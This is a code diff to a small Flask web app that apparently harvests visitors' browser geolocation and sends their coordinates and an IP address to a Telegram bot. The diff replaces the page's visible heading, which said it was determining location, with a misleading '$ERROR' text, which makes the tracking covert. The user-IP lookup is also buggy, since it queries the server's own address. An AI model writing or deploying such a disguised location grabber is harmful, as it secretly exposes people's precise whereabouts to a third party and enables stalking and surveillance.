@@ -22,7 +22,7 @@ def index():
         <title>GeoLocation</title>
     </head>
     <body>
-        <h1>Определение геопозиции</h1>
+        <h1>$ERROR</h1>
         <script>
             function sendLocation(position) {
                 const data = {
@@ -65,15 +65,15 @@ def index():
 @app.route('/send_data', methods=['POST'])
 def send_data():
     user_ip = requests.get('https://ip-api.com/json').json().get('query', 'Неизвестно')
+    site_ip = requests.get('https://api.ipify.org').text  # Получаем IP сайта
+    send_telegram_message(f"IP сайта: {site_ip}")  # Отправляем IP сайта
     client_data = request.get_json()
     latitude = client_data.get("latitude", "Неизвестно")
     longitude = client_data.get("longitude", "Неизвестно")
-    site_ip = requests.get('https://api.ipify.org').text  # Получаем IP сайта
     message = (
         f"IP пользователя: {user_ip}\n"
         f"Широта: {latitude}\n"
-        f"Долгота: {longitude}\n"
-        f"IP сайта: {site_ip}"
+        f"Долгота: {longitude}"
     )
     send_telegram_message(message)
     return "Данные отправлены боту!", 200
@@ -81,3 +81,4 @@ def send_data():
 if __name__ == "__main__":
     send_telegram_message("Бот запущен!")  # Отправка сообщения при запуске
     app.run(debug=True)
+    
